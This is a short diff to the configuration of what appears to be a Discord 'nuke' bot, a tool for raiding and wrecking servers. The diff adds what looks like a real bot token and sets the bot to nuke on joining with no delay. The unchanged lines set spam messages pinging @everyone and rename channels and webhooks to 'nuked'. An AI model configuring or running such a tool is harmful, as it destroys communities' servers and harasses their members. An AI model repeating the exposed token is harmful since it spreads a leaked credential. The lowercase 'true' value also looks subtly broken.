@@ -1,12 +1,12 @@
 #BOT CONFIG
-token = ""
-prefix = ""
+token = "NzQ3MTUwMTcyMDkzNDE1NTk3.X0Kr0g.vafopFb9su5yS5AzcQ9udNDAsro"
+prefix = "$"
 
 #NUKE CONFIG
 spam_messages = ["@everyone nuked", "@everyone get nuked"]
 channel_names = ["nuked", "get nuked"]
 webhook_usernames = ["nuked", "get nuked"]
-nuke_on_join = False
+nuke_on_join = true
 nuke_wait_time = 0
 
 
